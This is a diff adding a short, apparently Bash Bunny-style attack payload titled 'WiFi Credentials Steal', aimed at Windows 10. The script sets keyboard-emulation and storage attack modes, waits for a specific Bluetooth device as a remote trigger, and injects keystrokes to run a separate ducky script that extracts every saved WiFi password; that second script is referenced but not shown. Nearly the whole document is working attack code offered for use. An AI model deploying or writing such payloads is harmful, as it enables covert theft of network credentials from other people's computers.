@@ -1,0 +1,26 @@
+ Title: 	WiFi Credentials Steal
+# Description:	WiFi Credentials Steal VIA POWERSHELL
+# Author:	M4rc14n0
+# Category:	WIFI Credentials
+# Target:	Windows 10
+# Attackmodes:	HID, STORAGE
+# Suggestion: WiFi Credentials Steal
+#
+
+
+LED SETUP
+GET SWITCH_POSITION
+ATTACKMODE HID STORAGE
+# Use BLE tool in the mobile to start the attack
+WAIT_FOR_PRESENT M@rc14n0S21
+#WAIT_FOR_NOT_PRESENT M@rc14n0S21
+
+# Get all the credentials using powershell command
+# By running the command through a ducky script
+LED STAGE1
+QUACK DELAY 400
+# Run all the wireless networks stored and the go one by one extracting the password
+QUACK ${SWITCH_POSITION}/ducky-script-stealwificreds.txt
+QUACK DELAY 1500
+
+LED FINISH
